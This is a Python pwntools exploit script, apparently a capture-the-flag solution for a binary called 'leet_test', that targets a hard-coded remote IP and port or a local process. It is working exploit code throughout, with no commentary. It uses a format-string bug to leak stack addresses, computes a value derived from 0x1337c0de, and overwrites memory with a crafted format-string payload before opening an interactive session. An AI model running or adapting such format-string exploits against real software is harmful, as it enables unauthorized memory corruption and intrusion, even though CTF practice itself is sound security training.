from pwn import *

gs = '''
b *main+233
continue
'''

elf = context.binary = ELF("./leet_test")

def start():
    if args.REMOTE:
        return remote("83.136.254.158", 48817)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def leak_address(i):
    io.sendlineafter("Please enter your name: ", f"%{i}$p".encode())
    io.recvuntil(b"Hello, ")
    return io.recvline().decode().strip()

context.terminal = ['gnome-terminal', '-e']
io = start()

random_content_address = int("0x0000"+ leak_address(7)[2:6], 16)
winner_content_address = int(leak_address(49), 16) + 0x2dae

info(f"Leak random content: {hex(random_content_address)}")
info(f"Winner content Address: {hex(winner_content_address)}")

random_val_mul = (random_content_address * 0x1337c0de) & 0xffffffff

info(f"0x1337c0de * random-val:  {hex(random_content_address)}")

writes_dict = {
    winner_content_address: random_val_mul
}

payload = fmtstr_payload(10, writes_dict)

io.sendlineafter("Please enter your name: ", payload)

io.interactive()